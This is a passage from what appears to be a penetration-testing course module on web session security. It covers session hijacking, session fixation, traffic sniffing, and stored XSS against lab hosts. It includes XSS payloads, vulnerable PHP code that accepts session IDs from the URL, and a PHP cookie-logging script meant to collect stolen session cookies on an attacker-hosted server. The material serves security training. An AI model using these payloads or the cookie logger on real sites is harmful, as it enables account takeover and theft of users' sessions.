@@ -1,0 +1,976 @@
+<html><head></head><body>
+  <div class="container">
+<link rel="stylesheet" href="modules\style.css">
+
+<h1 id="17-session-security">17. Session Security</h1>
+<h2 id="introduction-to-sessions">Introduction to Sessions</h2>
+<hr>
+<p>A user session can be defined as a sequence of requests originating from the same client and the associated responses during a specific time period. Modern web applications need to maintain user sessions to keep track of information and status about each user. User sessions facilitate the assignment of access or authorization rights, localization settings, etc., while users interact with an application, pre, and post-authentication.</p>
+<p>HTTP is a stateless communication protocol, and as such, any request-response transaction is unrelated to other transactions. This means that each request should carry all needed information for the server to act upon it appropriately, and the session state resides on the client's side only.</p>
+<p>For the reason above, web applications utilize cookies, URL parameters, URL arguments (on GET requests), body arguments (on POST requests), and other proprietary solutions for session tracking and management purposes.</p>
+<hr>
+<h3 id="session-identifier-security">Session Identifier Security</h3>
+<p>A unique <strong>session identifier</strong> (Session ID) or token is the basis upon which user sessions are generated and distinguished.</p>
+<p>We should clarify that if an attacker obtains a session identifier, this can result in session hijacking, where the attacker can essentially impersonate the victim in the web application.</p>
+<p>An attacker can obtain a session identifier through a multitude of techniques, not all of which include actively attacking the victim. A session identifier can also be:</p>
+<ul>
+<li>Captured through passive traffic/packet sniffing</li>
+<li>Identified in logs</li>
+<li>Predicted</li>
+<li>Brute Forced</li>
+</ul>
+<p>Now let us focus on session identifier security for a minute.</p>
+<p>A session identifier's security level depends on its:</p>
+<ul>
+<li><code>Validity Scope</code> (a secure session identifier should be valid for one session only)</li>
+<li><code>Randomness</code> (a secure session identifier should be generated through a robust random number/string generation algorithm so that it cannot be predicted)</li>
+<li><code>Validity Time</code> (a secure session identifier should expire after a certain amount of time)</li>
+</ul>
+<p>The established programming technologies (PHP, JSP, etc.) generate session identifiers that "comply" with the above <em>validity scope</em>, <em>randomness</em>, and <em>validity time</em> requirements. If you come across a custom session identifier generation implementation, proceed with extreme caution and be as exhaustive as possible in your tests.</p>
+<p>A session identifier's security level also depends on the location where it is stored:</p>
+<ul>
+<li><code>URL</code>: If this is the case, the HTTP <em>Referer</em> header can leak a session identifier to other websites. In addition, browser history will also contain any session identifier stored in the URL.</li>
+<li><code>HTML</code>: If this is the case, the session identifier can be identified in both the browser's cache memory and any intermediate proxies</li>
+<li><code>sessionStorage</code>: SessionStorage is a browser storage feature introduced in HTML5. Session identifiers stored in sessionStorage can be retrieved as long as the tab or the browser is open. In other words, sessionStorage data gets cleared when the <em>page session</em> ends. Note that a page session survives over page reloads and restores.</li>
+<li><code>localStorage</code>: LocalStorage is a browser storage feature introduced in HTML5. Session identifiers stored in localStorage can be retrieved as long as localStorage does not get deleted by the user. This is because data stored within localStorage will not be deleted when the browser process is terminated, with the exception of "private browsing" or "incognito" sessions where data stored within localStorage are deleted by the time the last tab is closed.</li>
+</ul>
+<p>Session identifiers that are managed with no server interference or that do not follow the secure "characteristics" above should be reported as weak.</p>
+<hr>
+<h3 id="session-attacks">Session Attacks</h3>
+<p>This module will cover different types of session attacks and how to exploit them. These are:</p>
+<ul>
+<li><code>Session Hijacking</code>: In session hijacking attacks, the attacker takes advantage of insecure session identifiers, finds a way to obtain them, and uses them to authenticate to the server and impersonate the victim.</li>
+<li><code>Session Fixation</code>: Session Fixation occurs when an attacker can fixate a (valid) session identifier. As you can imagine, the attacker will then have to trick the victim into logging into the application using the aforementioned session identifier. If the victim does so, the attacker can proceed to a Session Hijacking attack (since the session identifier is already known).</li>
+<li><code>XSS (Cross-Site Scripting)</code> &lt;-- With a focus on user sessions</li>
+<li><code>CSRF (Cross-Site Request Forgery)</code>: Cross-Site Request Forgery (CSRF or XSRF) is an attack that forces an end-user to execute inadvertent actions on a web application in which they are currently authenticated. This attack is usually mounted with the help of attacker-crafted web pages that the victim must visit or interact with. These web pages contain malicious requests that essentially inherit the identity and privileges of the victim to perform an undesired function on the victim's behalf.</li>
+<li><code>Open Redirects</code> &lt;-- With a focus on user sessions: An Open Redirect vulnerability occurs when an attacker can redirect a victim to an attacker-controlled site by abusing a legitimate application's redirection functionality. In such cases, all the attacker has to do is specify a website under their control in a redirection URL of a legitimate website and pass this URL to the victim. As you can imagine, this is possible when the legitimate application's redirection functionality does not perform any kind of validation regarding the websites which the redirection points to.</li>
+</ul>
+<hr>
+<h3 id="module-targets">Module Targets</h3>
+<p>We will refer to URLs such as <code>http://xss.htb.net</code> throughout the module sections and exercises. We utilize virtual hosts (vhosts) to house the web applications to simulate a large, realistic environment with multiple webservers. Since these vhosts all map to a different directory on the same host, we have to make manual entries in our <code>/etc/hosts</code> file on the Pwnbox or local attack VM to interact with the lab. This needs to be done for any examples that show scans or screenshots using an FQDN.</p>
+<p>To do this quickly, we could run the following (be reminded that the password for your user can be found inside the <code>my_credentials.txt</code> file, which is placed on the Pwnbox's Desktop):</p>
+<pre><code class="lang-shell-session">root@htb[<span class="hljs-regexp">/htb]$ IP=ENTER SPAWNED TARGET IP HERE
+root@htb[/htb</span>]$ <span class="hljs-keyword">printf</span> <span class="hljs-string">"%s\t%s\n\n"</span> <span class="hljs-string">"$IP"</span> <span class="hljs-string">"xss.htb.net csrf.htb.net oredirect.htb.net minilab.htb.net"</span> | sudo tee -a /etc/hosts
+</code></pre>
+<p>After this command, our <code>/etc/hosts</code> file would look like the following (on a newly spawned Pwnbox):</p>
+<pre><code class="lang-shell-session">root@htb[/htb]$ cat /etc/hosts
+
+# Your <span class="hljs-keyword">system</span> has configured <span class="hljs-string">'manage_etc_hosts'</span> <span class="hljs-keyword">as</span> <span class="hljs-literal">True</span>.
+# As a result, <span class="hljs-keyword">if</span> you wish for changes to this file to persist
+# then you will need to either
+# a.) make changes to the master file <span class="hljs-keyword">in</span> /etc/cloud/templates/hosts.debian.tmpl
+# b.) change or remove the value <span class="hljs-keyword">of</span> <span class="hljs-string">'manage_etc_hosts'</span> <span class="hljs-keyword">in</span>
+#     /etc/cloud/cloud.cfg or cloud-config <span class="hljs-keyword">from</span> user-data
+#
+<span class="hljs-number">127.0</span><span class="hljs-number">.1</span><span class="hljs-number">.1</span> htb<span class="hljs-number">-9</span>zftpkslke.htb-cloud.com htb<span class="hljs-number">-9</span>zftpkslke
+<span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span> localhost
+
+# The following lines are desirable for IPv6 capable hosts
+::<span class="hljs-number">1</span> ip6-localhost ip6-loopback
+fe00::<span class="hljs-number">0</span> ip6-localnet
+ff00::<span class="hljs-number">0</span> ip6-mcastprefix
+ff02::<span class="hljs-number">1</span> ip6-allnodes
+ff02::<span class="hljs-number">2</span> ip6-allrouters
+ff02::<span class="hljs-number">3</span> ip6-allhosts
+
+&lt;TARGET IP&gt;    xss.htb.net csrf.htb.net oredirect.htb.net minilab.htb.net
+</code></pre>
+<p>You may wish to write your own script or edit the hosts file by hand, which is fine.</p>
+<p>If you spawn a target during a section and cannot access it directly via the IP be sure to check your hosts file and update any entries!</p>
+<p>Module exercises that require vhosts will display a list that you can use to edit your hosts file after spawning the target VM at the bottom of the respective section.</p>
+<p>Let's now dive into each of the previously mentioned session attacks and vulnerabilities in detail.</p>
+<h2 id="session-hijacking">Session Hijacking</h2>
+<hr>
+<p>In session hijacking attacks, the attacker takes advantage of insecure session identifiers, finds a way to obtain them, and uses them to authenticate to the server and impersonate the victim.</p>
+<p>An attacker can obtain a victim's session identifier using several methods, with the most common being:</p>
+<ul>
+<li>Passive Traffic Sniffing</li>
+<li>Cross-Site Scripting (XSS)</li>
+<li>Browser history or log-diving</li>
+<li>Read access to a database containing session information</li>
+</ul>
+<p>As mentioned in the previous section, if a session identifier's security level is low, an attacker may also be able to brute force it or even predict it.</p>
+<hr>
+<h3 id="session-hijacking-example">Session Hijacking Example</h3>
+<p>Proceed to the end of this section and click on <code>Click here to spawn the target system!</code>. Use the provided Pwnbox or a local VM with the supplied VPN key to reach the target application and follow along. Don't forget to configure the specified vhost (<code>xss.htb.net</code>) to access the application.</p>
+<p>A quick way to specify this (and any other) vhost in your attacking system is the below:</p>
+<pre><code class="lang-shell-session">root@htb[<span class="hljs-regexp">/htb]$ IP=ENTER SPAWNED TARGET IP HERE
+root@htb[/htb</span>]$ <span class="hljs-keyword">printf</span> <span class="hljs-string">"%s\t%s\n\n"</span> <span class="hljs-string">"$IP"</span> <span class="hljs-string">"xss.htb.net csrf.htb.net oredirect.htb.net minilab.htb.net"</span> | sudo tee -a /etc/hosts
+</code></pre>
+<p><strong>Part 1: Identify the session identifier</strong></p>
+<p>Navigate to <code>http://xss.htb.net</code> and log in to the application using the credentials below:</p>
+<ul>
+<li>Email: heavycat106</li>
+<li>Password: rocknrol</li>
+</ul>
+<p>This is an account that we created to look into the application!</p>
+<p>You should now be logged in as "Julie Rogers."</p>
+<p>Using Web Developer Tools (Shift+Ctrl+I in the case of Firefox), notice that the application is using a cookie named <code>auth-session</code> most probably as a session identifier. Double click this cookie's value and copy it! <img src="storage\modules\153\17.png" alt="image"></p>
+<hr>
+<p><strong>Part 2: Simulate an attacker</strong></p>
+<p>Now, suppose that you are the attacker and you somehow got access to the <code>auth-session</code> cookie's value for the user "Julie Rogers".</p>
+<p>Open a <code>New Private Window</code> and navigate to <code>http://xss.htb.net</code> again. Using Web Developer Tools (Shift+Ctrl+I in the case of Firefox), replace the current <code>auth-session</code> cookie's value with the one you copied in Part 1. Reload the current page, and you will notice that you are logged in as "Julie Rogers" without using any credentials!</p>
+<p><img src="storage\modules\153\16.png" alt="image"></p>
+<p>Congratulations! You just practiced your first session hijacking attack!</p>
+<p>Please note that you could come across web applications that utilize more than one cookie for session tracking purposes.</p>
+<p>In the following sections, we will cover how you can mount the most common session attacks in detail.</p>
+<h2 id="session-fixation">Session Fixation</h2>
+<hr>
+<p>Session Fixation occurs when an attacker can fixate a (valid) session identifier. As you can imagine, the attacker will then have to trick the victim into logging into the application using the aforementioned session identifier. If the victim does so, the attacker can proceed to a Session Hijacking attack (since the session identifier is already known).</p>
+<p>Such bugs usually occur when session identifiers (such as cookies) are being accepted from <em>URL Query Strings</em> or <em>Post Data</em> (more on that in a bit).</p>
+<p>Session Fixation attacks are usually mounted in three stages:</p>
+<p><strong>Stage 1: Attacker manages to obtain a valid session identifier</strong></p>
+<p>Authenticating to an application is not always a requirement to get a valid session identifier, and a large number of applications assign valid session identifiers to anyone who browses them. This also means that an attacker can be assigned a valid session identifier without having to authenticate.</p>
+<p><strong>Note</strong>: An attacker can also obtain a valid session identifier by creating an account on the targeted application (if this is a possibility).</p>
+<p><strong>Stage 2: Attacker manages to fixate a valid session identifier</strong></p>
+<p>The above is expected behavior, but it can turn into a session fixation vulnerability if:</p>
+<ul>
+<li>The assigned session identifier pre-login remains the same post-login <code>and</code></li>
+<li>Session identifiers (such as cookies) are being accepted from <em>URL Query Strings</em> or <em>Post Data</em> and propagated to the application</li>
+</ul>
+<p>If, for example, a session-related parameter is included in the URL (and not on the cookie header) and any specified value eventually becomes a session identifier, then the attacker can fixate a session.</p>
+<p><strong>Stage 3: Attacker tricks the victim into establishing a session using the abovementioned session identifier</strong></p>
+<p>All the attacker has to do is craft a URL and lure the victim into visiting it. If the victim does so, the web application will then assign this session identifier to the victim.</p>
+<p>The attacker can then proceed to a session hijacking attack since the session identifier is already known.</p>
+<hr>
+<h3 id="session-fixation-example">Session Fixation Example</h3>
+<p>Proceed to the end of this section and click on <code>Click here to spawn the target system!</code> or the <code>Reset Target</code> icon. Use the provided Pwnbox or a local VM with the supplied VPN key to reach the target application and follow along. Don't forget to configure the specified vhost (<code>oredirect.htb.net</code>) to access the application.</p>
+<p><strong>Part 1: Session fixation identification</strong></p>
+<p>Navigate to <code>oredirect.htb.net</code>. You will come across a URL of the below format:</p>
+<p><code>http://oredirect.htb.net/?redirect_uri=/complete.html&amp;token=&lt;RANDOM TOKEN VALUE&gt;</code></p>
+<p>Using Web Developer Tools (Shift+Ctrl+I in the case of Firefox), notice that the application uses a session cookie named <code>PHPSESSID</code> and that the cookie's value is the same as the <code>token</code> parameter's value on the URL.</p>
+<p><img src="storage\modules\153\18.png" alt="image"></p>
+<p>If any value or a valid session identifier specified in the <code>token</code> parameter on the URL is propagated to the <code>PHPSESSID</code> cookie's value, we are probably dealing with a session fixation vulnerability.</p>
+<p>Let us see if that is the case, as follows.</p>
+<p><strong>Part 2: Session fixation exploitation attempt</strong></p>
+<p>Open a <code>New Private Window</code> and navigate to <code>http://oredirect.htb.net/?redirect_uri=/complete.html&amp;token=IControlThisCookie</code></p>
+<p>Using Web Developer Tools (Shift+Ctrl+I in the case of Firefox), notice that the <code>PHPSESSID</code> cookie's value is <code>IControlThisCookie</code></p>
+<p><img src="storage\modules\153\19.png" alt="image"></p>
+<p>We are dealing with a Session Fixation vulnerability. An attacker could send a URL similar to the above to a victim. If the victim logs into the application, the attacker could easily hijack their session since the session identifier is already known (the attacker fixated it).</p>
+<p><strong>Note</strong>: Another way of identifying this is via blindly putting the session identifier name and value in the URL and then refreshing.</p>
+<p>For example, suppose we are looking into <code>http://insecure.exampleapp.com/login</code> for session fixation bugs, and the session identifier being used is a cookie named <code>PHPSESSID</code>. To test for session fixation, we could try the following <code>http://insecure.exampleapp.com/login?PHPSESSID=AttackerSpecifiedCookieValue</code> and see if the specified cookie value is propagated to the application (as we did in this section's lab exercise).</p>
+<p>Below is the vulnerable code of this section's lab exercise.</p>
+<pre><code class="lang-php"><span class="php"><span class="hljs-meta">&lt;?php</span>
+    <span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">"token"</span>])) {
+        session_start();
+        header(<span class="hljs-string">"Location: /?redirect_uri=/complete.html&amp;token="</span> . session_id());
+    } <span class="hljs-keyword">else</span> {
+        setcookie(<span class="hljs-string">"PHPSESSID"</span>, $_GET[<span class="hljs-string">"token"</span>]);
+    }
+<span class="hljs-meta">?&gt;</span></span>
+</code></pre>
+<p>Let us break the above piece of code down.</p>
+<pre><code class="lang-php"><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">"token"</span>])) {
+     session_start();
+</code></pre>
+<p>The above piece of code can be translated as follows: If the <em>token</em> parameter hasn't been defined, start a session (generate and provide a valid session identifier).</p>
+<pre><code class="lang-php">header(<span class="hljs-string">"Location: /?redirect_uri=/complete.html&amp;token="</span> . session_id())<span class="hljs-comment">;</span>
+</code></pre>
+<p>The above piece of code can be translated as follows: Redirect the user to <code>/?redirect_uri=/complete.html&amp;token=</code> and then call the _session_id()_ function to append _session_id_ onto the token value.</p>
+<pre><code class="lang-php"> } <span class="hljs-meta">else</span> {
+        setcookie(<span class="hljs-string">"PHPSESSID"</span>, $_<span class="hljs-meta">GET</span>[<span class="hljs-string">"token"</span>])<span class="hljs-comment">;</span>
+    }
+</code></pre>
+<p>The above piece of code can be translated as follows: If the <em>token</em> parameter is already set (else statement), set <em>PHPSESSID</em> to the value of the <em>token</em> parameter. Any URL in the following format <code>http://oredirect.htb.net/?redirect_uri=/complete.html&amp;token=AttackerSpecifiedCookieValue</code> will update <em>PHPSESSID</em>'s value with the <em>token</em> parameter's value.</p>
+<h2 id="obtaining-session-identifiers-without-user-interaction">Obtaining Session Identifiers without User Interaction</h2>
+<hr>
+<p>There are multiple attacking techniques through which a bug bounty hunter or penetration tester can obtain session identifiers. These attacking techniques can be split into two categories:</p>
+<ol>
+<li>Session ID-obtaining attacks without user interaction</li>
+<li>Session ID-obtaining attacks requiring user interaction</li>
+</ol>
+<p>This section will focus on Session ID-obtaining attacks that do not require user interaction.</p>
+<hr>
+<h3 id="obtaining-session-identifiers-via-traffic-sniffing">Obtaining Session Identifiers via Traffic Sniffing</h3>
+<p>Traffic sniffing is something that most penetration testers do when assessing a network's security from the inside. You will usually see them plugging their laptops or Raspberry Pis into available ethernet sockets. Doing so allows them to monitor the traffic and gives them an idea of the traffic going through the network (segment) and the services they may attack. Traffic sniffing requires the attacker and the victim to be on the same local network. Then and only then can HTTP traffic be inspected by the attacker. It is impossible for an attacker to perform traffic sniffing remotely.</p>
+<p>You may have noticed that we mentioned HTTP traffic. This is because HTTP is a protocol that transfers data unencrypted. Thus if an attacker is monitoring the network, they can catch all kinds of information such as usernames, passwords, and even session identifiers. This type of information will be more challenging and, most of the time, impossible to obtain if HTTP traffic is encrypted through SSL or IPsec.</p>
+<p>To sum up, obtaining session identifiers through traffic sniffing requires:</p>
+<ul>
+<li>The attacker must be positioned on the same local network as the victim</li>
+<li>Unencrypted HTTP traffic</li>
+</ul>
+<p>There are numerous packet sniffing tools. In this module, we will use <a href="https://www.wireshark.org/">Wireshark</a>. Wireshark has an inbuilt filter function that allows users to filter traffic for a specific protocol such as HTTP, SSH, FTP, and even for a particular source IP address.</p>
+<p>Let us practice session hijacking via traffic sniffing against a web application. This web application is the target we can spawn on the exercise at the end of this section.</p>
+<p>Navigate to the end of this section and click on <code>Click here to spawn the target system!</code> or the <code>Reset Target</code> icon. Use the provided Pwnbox or a local VM with the supplied VPN key to reach the target application and follow along. Don't forget to configure the specified vhost (<code>xss.htb.net</code>) to access the application.</p>
+<p>A quick way to specify this (and any other) vhost in your attacking system is the below:</p>
+<p>Obtaining Session Identifiers without User Interaction</p>
+<pre><code class="lang-shell-session">root@htb[<span class="hljs-regexp">/htb]$ IP=ENTER SPAWNED TARGET IP HERE
+root@htb[/htb</span>]$ <span class="hljs-keyword">printf</span> <span class="hljs-string">"%s\t%s\n\n"</span> <span class="hljs-string">"$IP"</span> <span class="hljs-string">"xss.htb.net csrf.htb.net oredirect.htb.net minilab.htb.net"</span> | sudo tee -a /etc/hosts
+</code></pre>
+<p><strong>Part 1: Simulate the attacker</strong></p>
+<p>Navigate to <code>http://xss.htb.net</code> and, using Web Developer Tools (Shift+Ctrl+I in the case of Firefox), notice that the application uses a cookie named <code>auth-session</code> most probably as a session identifier. <img src="storage\modules\153\3.png" alt="image"></p>
+<p>Now fire up Wireshark to start sniffing traffic on the local network as follows.</p>
+<p>Obtaining Session Identifiers without User Interaction</p>
+<pre><code class="lang-shell-session"><span class="hljs-selector-tag">root</span>@<span class="hljs-keyword">htb</span>[/<span class="hljs-keyword">htb</span>]$ sudo -E wireshark
+</code></pre>
+<p>You will come across the below. <img src="storage\modules\153\1.png" alt="image"></p>
+<p>Right-click "tun0" and then click "Start capture"</p>
+<p><strong>Part 2: Simulate the victim</strong></p>
+<p>Navigate to <code>http://xss.htb.net</code> through a <code>New Private Window</code> and login to the application using the credentials below:</p>
+<ul>
+<li>Email: heavycat106</li>
+<li>Password: rocknrol</li>
+</ul>
+<p>This is an account that we created to look into the application!</p>
+<p><strong>Part 3: Obtain the victim's cookie through packet analysis</strong></p>
+<p>Inside Wireshark, first, apply a filter to see only HTTP traffic. This can be done as follows (don't forget to press Enter after specifying the filter). <img src="storage\modules\153\2.png" alt="image"></p>
+<p>Now search within the Packet bytes for any <code>auth-session</code> cookies as follows.</p>
+<p>Navigate to <code>Edit</code> -&gt; <code>Find Packet</code> <img src="storage\modules\153\4.png" alt="image"></p>
+<p>Left-click on <code>Packet list</code> and then click <code>Packet bytes</code> <img src="storage\modules\153\5.png" alt="image"></p>
+<p>Select <code>String</code> on the third drop-down menu and specify <code>auth-session</code> on the field next to it. Finally, click <code>Find</code>. Wireshark will present you with the packets that include an <code>auth-session</code> string. <img src="storage\modules\153\6.png" alt="image"></p>
+<p>The cookie can be copied by right-clicking on a row that contains it, then clicking on <code>Copy</code> and finally clicking <code>Value</code>. <img src="storage\modules\153\8.png" alt="image"></p>
+<p><strong>Part 4: Hijack the victim's session</strong></p>
+<p>Back to the browser window using which you first browsed the application (not the Private Window), open Web Developer Tools, navigate to <em>storage</em>, and change your current cookie's value to the one you obtained through Wireshark (remember to remove the <code>auth-session=</code> part). <img src="storage\modules\153\9.png" alt="image"></p>
+<p>If you refresh the page, you will see that you are now logged in as the victim! <img src="storage\modules\153\10.png" alt="image"></p>
+<hr>
+<h3 id="obtaining-session-identifiers-post-exploitation-web-server-access-">Obtaining Session Identifiers Post-Exploitation (Web Server Access)</h3>
+<p><strong>Note</strong>: The below examples cannot be replicated in this section's lab exercise!</p>
+<p>During the post-exploitation phase, session identifiers and session data can be retrieved from either a web server's disk or memory. Of course, an attacker who has compromised a web server can do more than obtain session data and session identifiers. That said, an attacker may not want to continue issuing commands that increase the chances of getting caught.</p>
+<hr>
+<h4 id="php">PHP</h4>
+<p>Let us look at where PHP session identifiers are usually stored.</p>
+<p>The entry <code>session.save_path</code> in <code>PHP.ini</code> specifies where session data will be stored.</p>
+<p>Obtaining Session Identifiers without User Interaction</p>
+<pre><code class="lang-shell-session">root<span class="hljs-meta">@htb</span>[/htb]$ locate php.ini
+root<span class="hljs-meta">@htb</span>[<span class="hljs-regexp">/htb]$ cat /</span>etc<span class="hljs-regexp">/php/</span><span class="hljs-number">7.4</span><span class="hljs-regexp">/cli/</span>php.ini | grep <span class="hljs-string">'session.save_path'</span>
+root<span class="hljs-meta">@htb</span>[<span class="hljs-regexp">/htb]$ cat /</span>etc<span class="hljs-regexp">/php/</span><span class="hljs-number">7.4</span><span class="hljs-regexp">/apache2/</span>php.ini | grep <span class="hljs-string">'session.save_path'</span>
+</code></pre>
+<p><img src="storage\modules\153\11.png" alt="image"></p>
+<p>In our default configuration case it's <code>/var/lib/php/sessions</code>. Now, please note a victim has to be authenticated for us to view their session identifier. The files an attacker will search for use the name convention <code>sess_&lt;sessionID&gt;</code>.</p>
+<p>How a PHP session identifier looks on our local setup. <img src="storage\modules\153\12.png" alt="image"></p>
+<p>The same PHP session identifier but on the webserver side looks as follows.</p>
+<p>Obtaining Session Identifiers without User Interaction</p>
+<pre><code class="lang-shell-session">root<span class="hljs-meta">@htb</span>[<span class="hljs-regexp">/htb]$ ls /</span>var<span class="hljs-regexp">/lib/</span>php/sessions
+root<span class="hljs-meta">@htb</span>[<span class="hljs-regexp">/htb]$ cat /</span><span class="hljs-regexp">/var/</span>lib<span class="hljs-regexp">/php/</span>sessions/sess_s6kitq8d3071rmlvbfitpim9mm
+</code></pre>
+<p><img src="storage\modules\153\13.png" alt="image"></p>
+<p>As already mentioned, for a hacker to hijack the user session related to the session identifier above, a new cookie must be created in the web browser with the following values:</p>
+<ul>
+<li>cookie name: PHPSESSID</li>
+<li>cookie value: s6kitq8d3071rmlvbfitpim9mm</li>
+</ul>
+<hr>
+<h4 id="java">Java</h4>
+<p>Now, let us look at where Java session identifiers are stored.</p>
+<p>According to the Apache Software Foundation:</p>
+<p>"The <code>Manager</code> element represents the <em>session manager</em> that is used to create and maintain HTTP sessions of a web application.</p>
+<p>Tomcat provides two standard implementations of <code>Manager</code>. The default implementation stores active sessions, while the optional one stores active sessions that have been swapped out (in addition to saving sessions across a server restart) in a storage location that is selected via the use of an appropriate <code>Store</code> nested element. The filename of the default session data file is <code>SESSIONS.ser</code>."</p>
+<p>You can find more information <a href="http://tomcat.apache.org/tomcat-6.0-doc/config/manager.html">here</a>.</p>
+<hr>
+<h4 id="-net">.NET</h4>
+<p>Finally, let us look at where .NET session identifiers are stored.</p>
+<p>Session data can be found in:</p>
+<ul>
+<li>The application worker process (aspnet_wp.exe) - This is the case in the <em>InProc Session mode</em></li>
+<li>StateServer (A Windows Service residing on IIS or a separate server) - This is the case in the <em>OutProc Session mode</em></li>
+<li>An SQL Server</li>
+</ul>
+<p>Please refer to the following resource for more in-depth details: <a href="https://www.c-sharpcorner.com/UploadFile/225740/introduction-of-session-in-Asp-Net/">Introduction To ASP.NET Sessions</a></p>
+<hr>
+<h3 id="obtaining-session-identifiers-post-exploitation-database-access-">Obtaining Session Identifiers Post-Exploitation (Database Access)</h3>
+<p>In cases where you have direct access to a database via, for example, SQL injection or identified credentials, you should always check for any stored user sessions. See an example below.</p>
+<p>Code: sql</p>
+<pre><code class="lang-sql"><span class="hljs-keyword">show</span> <span class="hljs-keyword">databases</span>;
+<span class="hljs-keyword">use</span> <span class="hljs-keyword">project</span>;
+<span class="hljs-keyword">show</span> <span class="hljs-keyword">tables</span>;
+<span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> <span class="hljs-keyword">users</span>;
+</code></pre>
+<p><img src="storage\modules\153\14.png" alt="image"></p>
+<p>Here we can see the users' passwords are hashed. We could spend time trying to crack these; however, there is also a "all_sessions" table. Let us extract data from that table.</p>
+<p>Code: sql</p>
+<pre><code class="lang-sql"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> all_sessions;
+<span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> all_sessions <span class="hljs-keyword">where</span> <span class="hljs-keyword">id</span>=<span class="hljs-number">3</span>;
+</code></pre>
+<p><img src="storage\modules\153\15.png" alt="image"></p>
+<p>Here we have successfully extracted the sessions! You could now authenticate as the user "Developer."</p>
+<p>It is about time we cover Session ID-obtaining attacks requiring user interaction. In the following sections, we will cover:</p>
+<ul>
+<li>XSS (Cross-Site Scripting) &lt;-- With a focus on user sessions</li>
+<li>CSRF (Cross-Site Request Forgery)</li>
+<li>Open Redirects &lt;-- With a focus on user sessions</li>
+</ul>
+<h2 id="cross-site-scripting-xss-">Cross-Site Scripting (XSS)</h2>
+<hr>
+<p>Cross-Site Scripting (XSS) vulnerabilities are among the most common web application vulnerabilities. An XSS vulnerability may allow an attacker to execute arbitrary JavaScript code within the target's browser and result in complete web application compromise if chained together with other vulnerabilities. In this section, though, we will focus on exploiting Cross-Site Scripting (XSS) vulnerabilities to obtain valid session identifiers (such as session cookies).</p>
+<p>If you want to dive deeper into Cross-Site Scripting (XSS) vulnerabilities, we suggest you study our <a href="https://academy.hackthebox.com/module/details/103">Cross-Site Scripting (XSS)</a> module.</p>
+<p>For a Cross-Site Scripting (XSS) attack to result in session cookie leakage, the following requirements must be fulfilled:</p>
+<ul>
+<li>Session cookies should be carried in all HTTP requests</li>
+<li>Session cookies should be accessible by JavaScript code (the HTTPOnly attribute should be missing)</li>
+</ul>
+<p>Proceed to the end of this section and click on <code>Click here to spawn the target system!</code> or the <code>Reset Target</code> icon. Use the provided Pwnbox or a local VM with the supplied VPN key to reach the target application and follow along. Don't forget to configure the specified vhost (<code>xss.htb.net</code>) to access the application.</p>
+<p>Navigate to <code>http://xss.htb.net</code> and log in to the application using the credentials below:</p>
+<ul>
+<li>Email: crazygorilla983</li>
+<li>Password: pisces</li>
+</ul>
+<p>This is an account that we created to look at the application's functionality. It looks like we can edit the input fields to update our email, phone number, and country.</p>
+<p><img src="storage\modules\153\20.png" alt="image"></p>
+<p>In such cases, it is best to use payloads with event handlers like <code>onload</code> or <code>onerror</code> since they fire up automatically and also prove the highest impact on stored XSS cases. Of course, if they're blocked, you'll have to use something else like <code>onmouseover</code>.</p>
+<p>In one field, let us specify the following payload:</p>
+<p>Code: javascript</p>
+<pre><code class="lang-javascript">"&gt;<span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">x</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">prompt(document.domain)</span>&gt;</span>
+</code></pre>
+<p>We are using <code>document.domain</code> to ensure that JavaScript is being executed on the actual domain and not in a sandboxed environment. JavaScript being executed in a sandboxed environment prevents client-side attacks. It should be noted that sandbox escapes exist but are outside the scope of this module.</p>
+<p>In the remaining two fields, let us specify the following two payloads.</p>
+<p>Code: javascript</p>
+<pre><code class="lang-javascript">"&gt;<span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">x</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">confirm(1)</span>&gt;</span>
+</code></pre>
+<p>Code: javascript</p>
+<pre><code class="lang-javascript">"&gt;<span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">x</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">alert(1)</span>&gt;</span>
+</code></pre>
+<p>We will need to update the profile by pressing "Save" to submit our payloads.</p>
+<p><img src="storage\modules\153\21.png" alt="image"></p>
+<p>The profile was updated successfully. We notice no payload being triggered, though! Often, the payload code is not going to be called/executed until another application functionality triggers it. Let us go to "Share," as it is the only other functionality we have, to see if any of the submitted payloads are retrieved in there. This functionality returns a publicly accessible profile. Identifying a stored XSS vulnerability in such a functionality would be ideal from an attacker's perspective.</p>
+<p>That is indeed the case! The payload specified in the <em>Country</em> field fired!</p>
+<p><img src="storage\modules\153\22.png" alt="image"></p>
+<p>Let us now check if <em>HTTPOnly</em> is "off" using Web Developer Tools.</p>
+<p><img src="storage\modules\153\23.png" alt="image"></p>
+<p><em>HTTPOnly</em> is off!</p>
+<hr>
+<h3 id="obtaining-session-cookies-through-xss">Obtaining session cookies through XSS</h3>
+<p>We identified that we could create and share publicly accessible profiles that contain our specified XSS payloads.</p>
+<p>Let us create a cookie-logging script (save it as <code>log.php</code>) to practice obtaining a victim's session cookie through sharing a vulnerable to stored XSS public profile. The below PHP script can be hosted on a VPS or your attacking machine (depending on egress restrictions).</p>
+<p>Code: php</p>
+<pre><code class="lang-php">&lt;?php
+<span class="hljs-variable">$logFile</span> = <span class="hljs-string">"cookieLog.txt"</span>;
+<span class="hljs-variable">$cookie</span> = <span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">"c"</span>];
+
+<span class="hljs-variable">$handle</span> = fopen(<span class="hljs-variable">$logFile</span>, <span class="hljs-string">"a"</span>);
+fwrite(<span class="hljs-variable">$handle</span>, <span class="hljs-variable">$cookie</span> . <span class="hljs-string">"\n\n"</span>);
+fclose(<span class="hljs-variable">$handle</span>);
+
+header(<span class="hljs-string">"Location: http://www.google.com/"</span>);
+<span class="hljs-keyword">exit</span>;
+?&gt;
+</code></pre>
+<p>This script waits for anyone to request <code>?c=+document.cookie</code>, and it will then parse the included cookie.</p>
